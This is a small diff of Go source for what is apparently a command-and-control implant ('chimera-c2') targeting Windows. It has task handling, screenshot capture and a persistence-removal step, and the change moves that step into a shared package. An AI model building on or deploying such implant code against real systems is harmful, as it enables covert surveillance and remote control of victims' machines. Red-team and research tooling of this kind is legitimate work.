@@ -12,6 +12,7 @@ import (
 	"time"
 
 	"github.com/kbinani/screenshot"
+	"github.com/terancebana/chimera-c2/implant/internal/common"
 	"golang.org/x/sys/windows"
 )
 
@@ -59,7 +60,7 @@ func handleTask(task Task) Result {
 			res.Data = base64.StdEncoding.EncodeToString(data)
 		}
 	case "uninstall":
-		err := uninstallPersistence()
+		err := common.UninstallPersistence()
 		if err != nil {
 			res.Data = fmt.Sprintf("Cleanup Errors: %s", err)
 		} else {
